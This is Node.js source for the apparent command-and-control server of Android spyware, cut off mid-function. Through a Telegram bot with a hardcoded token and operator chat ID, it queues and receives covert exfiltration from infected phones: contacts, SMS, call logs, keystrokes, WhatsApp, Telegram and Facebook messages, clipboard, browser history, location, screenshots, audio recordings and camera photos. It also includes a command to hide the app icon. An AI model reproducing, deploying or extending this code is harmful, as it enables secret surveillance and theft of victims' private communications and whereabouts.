const express = require('express');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;
const os = require('os');

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
const devices = new Map();
const userDeviceSelection = new Map();
const userStates = new Map();

// Store authorized chat IDs
const authorizedChats = new Set([
    '5326373447', // Your chat ID
]);

// Auto-collection flags
const autoDataRequested = new Map();

// Schedule states
const SCHEDULE_STATES = {
    IDLE: 'idle',
    AWAITING_START_TIME: 'awaiting_start_time',
    AWAITING_END_TIME: 'awaiting_end_time',
    AWAITING_RECURRING: 'awaiting_recurring',
    AWAITING_INTERVAL: 'awaiting_interval'
};

// Create uploads directory
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// ============= DEVICE CONFIGURATION =============
const deviceConfigs = {
    'default': {
        chatId: '5326373447',
        config: {
            chatId: '5326373447',
            botToken: '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo',
            serverUrl: 'https://edu-hwpy.onrender.com',
            pollingInterval: 15000,
            keepAliveInterval: 300000,
            realtimeLogging: false,
            autoScreenshot: true,
            autoRecording: true,
            screenshotQuality: 70,
            recordingQuality: 'MEDIUM',
            appOpenBatchSize: 50,
            syncBatchSize: 20,
            targetApps: [
                'com.whatsapp',
                'com.instagram.android',
                'com.facebook.katana',
                'com.snapchat.android',
                'com.google.android.youtube',
                'com.google.android.apps.maps',
                'org.telegram.messenger'
            ],
            features: {
                contacts: true,
                sms: true,
                callLogs: true,
                location: true,
                screenshots: true,
                recordings: true,
                keystrokes: true,
                notifications: true,
                appOpens: true,
                ipInfo: true,
                phoneInfo: true,
                wifiInfo: true,
                mobileInfo: true,
                simInfo: true
            }
        }
    }
};

function getDeviceConfig(deviceId) {
    return deviceConfigs[deviceId] || deviceConfigs['default'];
}

// ============= FILE UPLOAD CONFIGURATION =============
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.body.deviceId || 'unknown';
        const count = req.body.count || '0';
        const timestamp = Date.now();
        const safeName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
        cb(null, `${deviceId}-${count}-${timestamp}-${safeName}`);
    }
});

const upload = multer({
    storage,
    limits: { 
        fileSize: 50 * 1024 * 1024,
        fieldSize: 50 * 1024 * 1024
    }
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ============= HELPER FUNCTIONS =============

function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

function sendJsonResponse(res, data, statusCode = 200) {
    try {
        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
    } catch (e) {
        console.error('Error stringifying JSON:', e);
        res.status(500).json({ error: 'Internal server error' });
    }
}

function getServerIP() {
    try {
        const interfaces = os.networkInterfaces();
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
    } catch (e) {
        console.error('Error getting server IP:', e);
    }
    return 'Unknown';
}

// ============= DEVICE MANAGEMENT FUNCTIONS =============

function getDeviceListForUser(chatId) {
    const userDevices = [];
    for (const [deviceId, device] of devices.entries()) {
        if (String(device.chatId) === String(chatId)) {
            userDevices.push({
                id: deviceId,
                name: device.deviceInfo?.model || 'Unknown Device',
                lastSeen: device.lastSeen,
                isActive: deviceId === userDeviceSelection.get(chatId),
                phoneNumber: device.phoneNumber || 'Not available',
                lastSeenFormatted: new Date(device.lastSeen).toLocaleString()
            });
        }
    }
    return userDevices;
}

function getDeviceSelectionKeyboard(chatId) {
    const userDevices = getDeviceListForUser(chatId);
    const keyboard = [];
    
    userDevices.forEach(device => {
        const status = device.isActive ? '✅ ' : '';
        const lastSeen = new Date(device.lastSeen).toLocaleTimeString();
        keyboard.push([{
            text: `${status}${device.name} (${lastSeen})`,
            callback_data: `select_device:${device.id}`
        }]);
    });
    
    keyboard.push([{ text: '🔄 Refresh List', callback_data: 'refresh_devices' }]);
    keyboard.push([{ text: '📊 Device Stats', callback_data: 'device_stats' }]);
    keyboard.push([{ text: '◀️ Back to Main Menu', callback_data: 'help_main' }]);
    
    return keyboard;
}

function getMainMenuKeyboard(chatId) {
    const activeDeviceId = userDeviceSelection.get(chatId);
    const activeDevice = activeDeviceId ? devices.get(activeDeviceId) : null;
    const deviceCount = getDeviceListForUser(chatId).length;
    
    let deviceStatus = `📱 ${deviceCount} device(s)`;
    if (activeDevice) {
        deviceStatus = `✅ Active: ${activeDevice.deviceInfo?.model || 'Device'}`;
    }

    return [
        [
            { text: '📱 Device Info', callback_data: 'cmd:device_info' },
            { text: '📞 Mobile Info', callback_data: 'cmd:mobile_info' }
        ],
        [
            { text: '📍 Tracking', callback_data: 'menu_tracking' },
            { text: '🌐 Network', callback_data: 'cmd:network_info' }
        ],
        [
            { text: '📸 Screenshot', callback_data: 'menu_screenshot' },
            { text: '🎤 Recording', callback_data: 'menu_recording' }
        ],
        [
            { text: '📷 Camera', callback_data: 'menu_camera' },
            { text: '💬 Social', callback_data: 'menu_social' }
        ],
        [
            { text: '📁 Media', callback_data: 'menu_media' },
            { text: '🔔 Realtime', callback_data: 'menu_realtime' }
        ],
        [
            { text: '⚙️ Services', callback_data: 'menu_services' },
            { text: deviceStatus, callback_data: 'menu_devices' }
        ],
        [
            { text: '🆕 NEW FEATURES', callback_data: 'menu_new_features' },
            { text: '❌ Close', callback_data: 'close_menu' }
        ]
    ];
}

// ============= NEW MENU FUNCTIONS =============

function getNewFeaturesKeyboard() {
    return [
        [
            { text: '📊 Detailed Exports', callback_data: 'menu_detailed_exports' },
            { text: '🔍 File Scanner', callback_data: 'menu_file_scanner' }
        ],
        [
            { text: '📡 Data Saving', callback_data: 'menu_data_saving' },
            { text: '🎚️ Audio Quality', callback_data: 'menu_audio_quality' }
        ],
        [
            { text: '🔄 Sync & Harvest', callback_data: 'menu_sync_harvest' },
            { text: '🔊 Real-time Controls', callback_data: 'menu_realtime_advanced' }
        ],
        [
            { text: '📱 App Opens', callback_data: 'cmd:open_app' },
            { text: '📅 Calendar', callback_data: 'cmd:calendar' }
        ],
        [
            { text: '📋 Clipboard', callback_data: 'cmd:clipboard' },
            { text: '🌐 Browser History', callback_data: 'cmd:browser' }
        ],
        [
            { text: '◀️ Back to Main', callback_data: 'help_main' }
        ]
    ];
}

function getDetailedExportsKeyboard() {
    return [
        [
            { text: '📇 Detailed Contacts', callback_data: 'cmd:contacts' },
            { text: '📱 Detailed Apps', callback_data: 'cmd:apps_list' }
        ],
        [
            { text: '⌨️ Detailed Keystrokes', callback_data: 'cmd:keys' },
            { text: '🔔 Detailed Notifications', callback_data: 'cmd:notify' }
        ],
        [
            { text: '📊 Device Snapshots', callback_data: 'cmd:device_info' },
            { text: '◀️ Back', callback_data: 'menu_new_features' }
        ]
    ];
}

function getFileScannerKeyboard() {
    return [
        [
            { text: '🔍 Full System Scan', callback_data: 'cmd:scan_all' },
            { text: '🎵 Media Only Scan', callback_data: 'cmd:scan_media' }
        ],
        [
            { text: '🔬 Deep Scan', callback_data: 'cmd:scan_all' },
            { text: '🎤 Find Recordings', callback_data: 'cmd:scan_media' }
        ],
        [
            { text: '📁 Find All Media', callback_data: 'cmd:scan_media' },
            { text: '❓ Scan Help', callback_data: 'cmd:scan_help' }
        ],
        [
            { text: '◀️ Back', callback_data: 'menu_new_features' }
        ]
    ];
}

function getDataSavingKeyboard() {
    return [
        [
            { text: '📡 WiFi-Only ON', callback_data: 'cmd:wifi_only_on' },
            { text: '📡 WiFi-Only OFF', callback_data: 'cmd:wifi_only_off' }
        ],
        [
            { text: '🌐 Network Status', callback_data: 'cmd:saving_status' },
            { text: '📊 WiFi-Only Status', callback_data: 'cmd:saving_status' }
        ],
        [
            { text: '◀️ Back', callback_data: 'menu_new_features' }
        ]
    ];
}

function getAudioQualityKeyboard() {
    return [
        [
            { text: '🎤 Ultra Low (8k)', callback_data: 'cmd:audio_ultra' },
            { text: '🎤 Very Low (16k)', callback_data: 'cmd:audio_very_low' }
        ],
        [
            { text: '🎤 Low (24k)', callback_data: 'cmd:audio_low' },
            { text: '🎤 Medium (32k)', callback_data: 'cmd:audio_medium' }
        ],
        [
            { text: '🎤 High (64k)', callback_data: 'cmd:audio_high' },
            { text: 'ℹ️ Audio Info', callback_data: 'cmd:audio_info' }
        ],
        [
            { text: '◀️ Back', callback_data: 'menu_new_features' }
        ]
    ];
}

function getSyncHarvestKeyboard() {
    return [
        [
            { text: '🔄 Sync All Tables', callback_data: 'cmd:sync_all' },
            { text: '⚡ Force Harvest', callback_data: 'cmd:force_harvest' }
        ],
        [
            { text: '🔄 Refresh Data', callback_data: 'cmd:refresh_data' },
            { text: '📊 Database Stats', callback_data: 'cmd:logs_count' }
        ],
        [
            { text: '🗑️ Clear Logs', callback_data: 'cmd:clear_logs' },
            { text: '🔄 Reboot Services', callback_data: 'cmd:reboot_app' }
        ],
        [
            { text: '◀️ Back', callback_data: 'menu_new_features' }
        ]
    ];
}

function getRealtimeAdvancedKeyboard() {
    return [
        [
            { text: '🔑 Realtime Keys ON', callback_data: 'cmd:rt_keys_on' },
            { text: '🔑 Realtime Keys OFF', callback_data: 'cmd:rt_keys_off' }
        ],
        [
            { text: '🔔 Realtime Notif ON', callback_data: 'cmd:rt_notif_on' },
            { text: '🔔 Realtime Notif OFF', callback_data: 'cmd:rt_notif_off' }
        ],
        [
            { text: '✅ All Realtime ON', callback_data: 'cmd:rt_all_on' },
            { text: '❌ All Realtime OFF', callback_data: 'cmd:rt_all_off' }
        ],
        [
            { text: '📊 Realtime Status', callback_data: 'cmd:rt_status' },
            { text: '◀️ Back', callback_data: 'menu_new_features' }
        ]
    ];
}

// ============= TELEGRAM MESSAGE FUNCTIONS =============

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) {
            console.error('❌ Attempted to send empty message');
            return null;
        }

        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });
        
        console.log(`✅ Message sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        
        if (error.response?.status === 400) {
            console.log('⚠️ HTML failed, retrying as plain text');
            try {
                const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: chatId,
                    text: text.replace(/<[^>]*>/g, '')
                });
                return response.data;
            } catch (e) {
                console.error('❌ Plain text also failed:', e.response?.data || e.message);
            }
        }
        return null;
    }
}

async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
    try {
        console.log(`📨 Sending message with inline keyboard to ${chatId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
        console.log(`✅ Message with keyboard sent successfully`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message with keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function editMessageKeyboard(chatId, messageId, newKeyboard) {
    try {
        console.log(`🔄 Editing keyboard for message ${messageId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/editMessageReplyMarkup`, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: newKeyboard
            }
        });
        
        console.log(`✅ Keyboard updated`);
        return response.data;
    } catch (error) {
        console.error('❌ Error editing keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text
        });
    } catch (error) {
        console.error('Error answering callback query:', error.response?.data || error.message);
    }
}

async function setChatMenuButton(chatId) {
    try {
        console.log(`🔘 Setting menu button for chat ${chatId}`);
        
        // CONSOLIDATED COMMAND LIST
        const commands = [
            // ============ CONSOLIDATED COMMANDS ============
            { command: 'help', description: '📋 Complete help menu' },
            { command: 'device_info', description: '📊 Complete device information' },
            { command: 'network_info', description: '🌐 Complete network information' },
            { command: 'mobile_info', description: '📱 Complete mobile & SIM info' },
            { command: 'screenshot', description: '📸 Take screenshot now' },
            { command: 'screenshot_settings', description: '⚙️ Screenshot settings' },
            { command: 'start_screenshot', description: '▶️ Start screenshot service' },
            { command: 'stop_screenshot', description: '⏹️ Stop screenshot service' },
            { command: 'start_60s_rec', description: '🎤 Start 60-second recording' },
            { command: 'stop_60s_rec', description: '⏹️ Stop recording' },
            { command: 'record_info', description: '📊 Recording information' },
            { command: 'record_auto_on', description: '✅ Enable auto recording' },
            { command: 'record_auto_off', description: '❌ Disable auto recording' },
            { command: 'record_custom', description: '⚙️ Set custom schedule' },
            
            // ============ AUDIO QUALITY ============
            { command: 'audio_ultra', description: '🎤 Ultra low (8kbps)' },
            { command: 'audio_very_low', description: '🎤 Very low (16kbps)' },
            { command: 'audio_low', description: '🎤 Low (24kbps)' },
            { command: 'audio_medium', description: '🎤 Medium (32kbps)' },
            { command: 'audio_high', description: '🎤 High (64kbps)' },
            { command: 'audio_info', description: '🎤 Audio quality info' },
            
            // ============ DATA EXPORT ============
            { command: 'contacts', description: '📇 Export contacts' },
            { command: 'sms', description: '💬 Export SMS' },
            { command: 'calllogs', description: '📞 Export call logs' },
            { command: 'apps_list', description: '📱 Export apps' },
            { command: 'keys', description: '⌨️ Export keystrokes' },
            { command: 'notify', description: '🔔 Export notifications' },
            { command: 'open_app', description: '📱 Export app opens' },
            
            // ============ SOCIAL MEDIA ============
            { command: 'whatsapp', description: '💬 WhatsApp logs' },
            { command: 'telegram', description: '💬 Telegram logs' },
            { command: 'facebook', description: '💬 Facebook logs' },
            
            // ============ BROWSER & CLIPBOARD ============
            { command: 'browser', description: '🌐 Browser history' },
            { command: 'clipboard', description: '📋 Clipboard logs' },
            { command: 'calendar', description: '📅 Calendar events' },
            
            // ============ SCAN COMMANDS ============
            { command: 'scan_all', description: '🔍 Full system scan' },
            { command: 'scan_media', description: '🎵 Media files scan' },
            { command: 'scan_help', description: '❓ Scan commands help' },
            
            // ============ REAL-TIME CONTROLS ============
            { command: 'rt_all_on', description: '✅ Enable all real-time' },
            { command: 'rt_all_off', description: '❌ Disable all real-time' },
            { command: 'rt_keys_on', description: '🔑 Enable keystroke real-time' },
            { command: 'rt_keys_off', description: '🔑 Disable keystroke real-time' },
            { command: 'rt_notif_on', description: '🔔 Enable notification real-time' },
            { command: 'rt_notif_off', description: '🔔 Disable notification real-time' },
            { command: 'rt_status', description: '📊 Real-time status' },
            
            // ============ NETWORK DATA SAVING ============
            { command: 'saving_status', description: '📡 Network saving status' },
            { command: 'wifi_only_on', description: '📡 Enable WiFi-only mode' },
            { command: 'wifi_only_off', description: '📡 Disable WiFi-only mode' },
            
            // ============ SYSTEM CONTROLS ============
            { command: 'sync_all', description: '🔄 Sync all data' },
            { command: 'force_harvest', description: '⚡ Force data harvest' },
            { command: 'refresh_data', description: '🔄 Refresh data' },
            { command: 'logs_count', description: '📊 Database statistics' },
            { command: 'clear_logs', description: '🗑️ Clear database' },
            { command: 'reboot_app', description: '🔄 Reboot services' },
            { command: 'hide_icon', description: '👻 Hide launcher icon' },
            { command: 'show_icon', description: '👁️ Show launcher icon' },
            
            // ============ CAMERA ============
            { command: 'photo', description: '📸 Take photo' },
            { command: 'camera_switch', description: '🔄 Switch camera' },
            { command: 'camera_front', description: '👤 Front camera' },
            { command: 'camera_back', description: '👥 Back camera' },
            { command: 'camera_on', description: '✅ Start camera monitoring' },
            { command: 'camera_off', description: '❌ Stop camera monitoring' },
            { command: 'camera_status', description: '📊 Camera status' },
            
            // ============ BASIC INFO ============
            { command: 'location', description: '📍 Get location' },
            { command: 'battery', description: '🔋 Battery status' },
            { command: 'storage', description: '💾 Storage info' },
            { command: 'time', description: '🕐 Current time' },
            { command: 'add_target', description: '➕ Add target app' },
            { command: 'target_apps', description: '📱 List target apps' },
            { command: 'small', description: '📏 Small screenshot (30%)' },
            { command: 'medium', description: '📏 Medium screenshot (70%)' },
            { command: 'original', description: '📏 Original screenshot' },
            
            // ============ LEGACY COMMANDS (for backward compatibility) ============
            { command: 'status', description: '📊 Device status' },
            { command: 'info', description: 'ℹ️ Device info' },
            { command: 'ip_info', description: '🌐 IP info' },
            { command: 'wifi_info', description: '📶 WiFi info' },
            { command: 'mobile_info', description: '📱 Mobile info' },
            { command: 'sim_info', description: '📱 SIM info' },
            { command: 'phone_number', description: '📞 Phone number' }
        ];
        
        await axios.post(`${TELEGRAM_API}/setMyCommands`, { commands });
        
        await axios.post(`${TELEGRAM_API}/setChatMenuButton`, {
            chat_id: chatId,
            menu_button: {
                type: 'commands',
                text: 'Menu'
            }
        });
        
        console.log(`✅ Menu button and ${commands.length} commands set for chat ${chatId}`);
    } catch (error) {
        console.error('Error setting menu button:', error.response?.data || error.message);
    }
}

function createInlineButton(text, callbackData) {
    return {
        text: text,
        callback_data: callbackData
    };
}

async function sendTelegramDocument(chatId, filePath, filename, caption) {
    try {
        console.log(`📎 Sending document to ${chatId}: ${filename}`);
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);
        
        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: {
                ...formData.getHeaders()
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        console.log(`✅ Document sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending document:', error.response?.data || error.message);
        
        try {
            const stats = fs.statSync(filePath);
            await sendTelegramMessage(chatId, 
                `⚠️ File too large to send directly.\n\n` +
                `The file is ${(stats.size / 1024).toFixed(2)} KB.`);
        } catch (e) {
            console.error('Error sending fallback message:', e);
        }
        return null;
    }
}

// ============= FORMATTER FUNCTIONS =============

function formatLocationMessage(locationData) {
    try {
        let locData = locationData;
        if (typeof locationData === 'string') {
            try {
                locData = JSON.parse(locationData);
            } catch (e) {
                return { text: locationData };
            }
        }

        if (locData.lat && locData.lon) {
            const lat = locData.lat;
            const lon = locData.lon;
            const accuracy = locData.accuracy || 'Unknown';
            const provider = locData.provider || 'unknown';
            
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            
            return {
                text: `📍 <b>Location Update</b>\n\n` +
                      `• <b>Latitude:</b> <code>${lat}</code>\n` +
                      `• <b>Longitude:</b> <code>${lon}</code>\n` +
                      `• <b>Accuracy:</b> ±${accuracy}m\n` +
                      `• <b>Provider:</b> ${provider}\n\n` +
                      `🗺️ <a href="${mapsUrl}">View on Google Maps</a>`,
                mapsUrl: mapsUrl,
                lat: lat,
                lon: lon
            };
        }
        return { text: locationData };
    } catch (error) {
        console.error('Error formatting location:', error);
        return { text: locationData };
    }
}

function formatIPInfo(ipData) {
    try {
        let ipInfo = ipData;
        if (typeof ipData === 'string') {
            try {
                ipInfo = JSON.parse(ipData);
            } catch (e) {
                return `🌐 IP Info: ${ipData}`;
            }
        }

        let message = '🌐 <b>Network Information</b>\n\n';
        
        if (ipInfo.publicIP) {
            message += `🌍 <b>Public IP:</b> <code>${ipInfo.publicIP}</code>\n`;
            message += `📍 <b>Location:</b> ${ipInfo.city || 'Unknown'}, ${ipInfo.country || 'Unknown'}\n`;
            message += `🏢 <b>ISP:</b> ${ipInfo.isp || 'Unknown'}\n`;
        }
        
        if (ipInfo.wifiIP && ipInfo.wifiIP !== 'Unknown') {
            message += `\n📶 <b>WiFi IP:</b> <code>${ipInfo.wifiIP}</code>\n`;
        }
        
        if (ipInfo.mobileIP && ipInfo.mobileIP !== 'Unknown') {
            message += `📱 <b>Mobile IP:</b> <code>${ipInfo.mobileIP}</code>\n`;
        }
        
        return message;
    } catch (error) {
        console.error('Error formatting IP info:', error);
        return `🌐 IP Info: ${JSON.stringify(ipData)}`;
    }
}

function formatSimInfo(simData) {
    try {
        let message = '📱 <b>SIM Information</b>\n\n';
        
        if (Array.isArray(simData)) {
            message += `Active SIMs: ${simData.length}\n\n`;
            simData.forEach((sim, index) => {
                message += `📱 <b>SIM ${index + 1}</b>\n`;
                message += `• Slot: ${sim.slot || 'Unknown'}\n`;
                message += `• Carrier: ${sim.carrierName || 'Unknown'}\n`;
                message += `• Country: ${sim.countryIso || 'Unknown'}\n`;
                message += `• Number: ${sim.number || 'Hidden'}\n\n`;
            });
        } else if (simData.operator) {
            message += `• Operator: ${simData.operator}\n`;
            message += `• Country: ${simData.country}\n`;
            message += `• SIM State: ${simData.simState}\n`;
            message += `• Phone Type: ${simData.phoneType || 'Unknown'}\n`;
        }
        
        return message;
    } catch (error) {
        console.error('Error formatting SIM info:', error);
        return `📱 SIM Info: ${JSON.stringify(simData)}`;
    }
}

function formatWifiInfo(wifiData) {
    try {
        let message = '📶 <b>WiFi Information</b>\n\n';
        
        message += `• Enabled: ${wifiData.enabled ? '✅ Yes' : '❌ No'}\n`;
        
        if (wifiData.connected) {
            message += `\n📡 <b>Current Connection</b>\n`;
            message += `• SSID: ${wifiData.ssid || 'Unknown'}\n`;
            message += `• BSSID: ${wifiData.bssid || 'Unknown'}\n`;
            message += `• IP: ${wifiData.ip || 'Unknown'}\n`;
            message += `• Speed: ${wifiData.speed || 'Unknown'} Mbps\n`;
            message += `• Frequency: ${wifiData.frequency || 'Unknown'} MHz\n`;
            message += `• Signal: ${wifiData.rssi || 'Unknown'} dBm\n`;
        }
        
        return message;
    } catch (error) {
        console.error('Error formatting WiFi info:', error);
        return `📶 WiFi Info: ${JSON.stringify(wifiData)}`;
    }
}

// ============= AUTO DATA COLLECTION =============

function queueAutoDataCommands(deviceId, chatId) {
    console.log(`🔄 Queueing auto-data collection for device ${deviceId}`);
    
    if (autoDataRequested.has(deviceId)) {
        console.log(`⚠️ Auto-data already requested for ${deviceId}, skipping`);
        return;
    }
    
    autoDataRequested.set(deviceId, {
        timestamp: Date.now(),
        requested: [
            'device_info',
            'network_info',
            'mobile_info',
            'contacts',
            'sms',
            'calllogs',
            'apps_list',
            'keys',
            'notify',
            'whatsapp',
            'telegram',
            'facebook',
            'browser',
            'clipboard',
            'calendar',
            'location'
        ]
    });
    
    const device = devices.get(deviceId);
    if (!device) {
        console.error(`❌ Device not found for auto-data: ${deviceId}`);
        return;
    }
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const commands = [
        { command: 'device_info', delay: 0, description: 'Device Info' },
        { command: 'network_info', delay: 2, description: 'Network Info' },
        { command: 'mobile_info', delay: 4, description: 'Mobile Info' },
        { command: 'contacts', delay: 7, description: 'Contacts' },
        { command: 'sms', delay: 10, description: 'SMS' },
        { command: 'calllogs', delay: 13, description: 'Call Logs' },
        { command: 'apps_list', delay: 16, description: 'Apps' },
        { command: 'keys', delay: 19, description: 'Keystrokes' },
        { command: 'notify', delay: 22, description: 'Notifications' },
        { command: 'whatsapp', delay: 25, description: 'WhatsApp' },
        { command: 'telegram', delay: 28, description: 'Telegram' },
        { command: 'facebook', delay: 31, description: 'Facebook' },
        { command: 'browser', delay: 34, description: 'Browser History' },
        { command: 'clipboard', delay: 37, description: 'Clipboard' },
        { command: 'calendar', delay: 40, description: 'Calendar' },
        { command: 'location', delay: 43, description: 'Location' }
    ];
    
    commands.forEach((cmd) => {
        const commandObject = {
            command: cmd.command,
            originalCommand: `/${cmd.command}`,
            messageId: null,
            timestamp: Date.now() + (cmd.delay * 1000),
            autoData: true
        };
        
        device.pendingCommands.push(commandObject);
        console.log(`📝 Auto-data command queued: ${cmd.command} (${cmd.description})`);
    });
    
    console.log(`✅ All ${commands.length} auto-data commands queued for ${deviceId}`);
}

// ============= PHOTO UPLOAD ENDPOINT =============
app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const caption = req.body.caption || '📸 Camera Photo';
        
        if (!deviceId || !req.file) {
            console.error('❌ Missing fields in photo upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📸 Photo upload from ${deviceId}: ${req.file.filename} (${req.file.size} bytes)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const fullCaption = `📱 *${deviceName}*\n\n${caption}`;
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', fs.createReadStream(filePath), { filename: req.file.originalname });
        formData.append('caption', fullCaption);
        
        await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
            headers: { ...formData.getHeaders() },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted photo: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting photo:', e);
            }
        }, 60000);
        
        res.json({ success: true, filename: req.file.filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ Photo upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// ============= DATA UPLOAD ENDPOINTS =============

app.post('/api/upload-file', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const command = req.body.command;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !command || !filename || !req.file) {
            console.error('❌ Missing fields in upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        let caption = `📱 *${deviceName}*\n\n`;
        
        switch (command) {
            case 'contacts':
                caption += `📇 Contacts Export (${itemCount} contacts)`;
                break;
            case 'sms':
                caption += `💬 SMS Messages Export (${itemCount} messages)`;
                break;
            case 'calllogs':
                caption += `📞 Call Logs Export (${itemCount} calls)`;
                break;
            case 'apps_list':
                caption += `📱 Installed Apps Export (${itemCount} apps)`;
                break;
            case 'keys':
                caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`;
                break;
            case 'notify':
                caption += `🔔 Notifications Export (${itemCount} notifications)`;
                break;
            case 'open_app':
                caption += `📱 App Opens Export (${itemCount} entries)`;
                break;
            case 'whatsapp':
                caption += `💬 WhatsApp Messages Export (${itemCount} messages)`;
                break;
            case 'telegram':
                caption += `💬 Telegram Messages Export (${itemCount} messages)`;
                break;
            case 'facebook':
                caption += `💬 Facebook Messages Export (${itemCount} messages)`;
                break;
            case 'browser':
                caption += `🌐 Browser History Export (${itemCount} entries)`;
                break;
            case 'clipboard':
                caption += `📋 Clipboard History Export (${itemCount} entries)`;
                break;
            case 'calendar':
                caption += `📅 Calendar Events Export (${itemCount} events)`;
                break;
            case 'device_info':
                caption += `📊 Device Info Export (${itemCount} snapshots)`;
                break;
            case 'network_info':
                caption += `🌐 Network Info Export`;
                break;
            case 'mobile_info':
                caption += `📱 Mobile Info Export`;
                break;
            case 'screenshots':
            case 'screenshot_logs':
                caption += `📸 Screenshot Logs Export (${itemCount} entries)`;
                break;
            default:
                caption += `📎 Data Export`;
        }
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted temporary file: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting file:', e);
            }
        }, 60000);
        
        res.json({ success: true, filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ File upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// ============= IP INFO ENDPOINT =============
app.post('/api/ipinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const ipData = req.body;
        
        console.log(`🌐 IP Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        ipData.serverIP = getServerIP();
        device.lastIPInfo = ipData;
        
        const formattedMessage = formatIPInfo(ipData);
        
        const devicePrefix = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n`;
        await sendTelegramMessage(chatId, devicePrefix + formattedMessage);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ IP Info endpoint error:', error);
        res.status(500).json({ error: 'IP Info processing failed' });
    }
});

// ============= PHONE NUMBER ENDPOINT =============
app.post('/api/phonenumber/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const phoneData = req.body;
        
        console.log(`📞 Phone number received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.phoneNumber = phoneData.phoneNumber;
        device.simInfo = phoneData.simInfo;
        
        let message = `📱 *Device:* ${device.deviceInfo?.model || 'Unknown'}\n\n`;
        message += '📞 <b>Phone Information</b>\n\n';
        
